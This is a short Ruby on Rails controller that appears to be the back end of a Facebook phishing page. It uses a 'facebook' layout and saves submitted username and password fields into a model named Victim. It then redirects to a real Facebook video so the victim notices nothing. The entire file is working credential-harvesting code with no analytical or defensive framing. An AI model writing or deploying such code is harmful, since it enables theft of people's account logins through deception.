class VictimsController < ApplicationController
	layout 'facebook'
	def new 
		 @V= Victim.new
	end
	def create
		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con])
		redirect_to 'https://www.facebook.com/galatziaoficial/videos/992663864137637/?theater'
	end
end
